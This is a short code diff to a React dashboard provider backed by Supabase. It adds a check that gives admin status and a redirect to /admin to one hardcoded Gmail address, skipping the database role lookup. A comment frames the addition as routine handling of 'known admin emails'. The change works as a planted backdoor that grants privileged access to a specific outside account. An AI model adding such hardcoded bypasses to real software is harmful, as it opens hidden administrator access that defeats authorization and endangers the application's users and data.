@@ -61,6 +61,12 @@ export function DashboardProvider({ children }) {
     if (!user) return;
     (async () => {
       try {
+        // Grant admin access for known admin emails
+        if (user.email === "kalitest928ya@gmail.com") {
+          setIsAdmin(true);
+          navigate("/admin");
+          return;
+        }
         const { data: roleData } = await supabase
           .from("user_roles")
           .select("role")
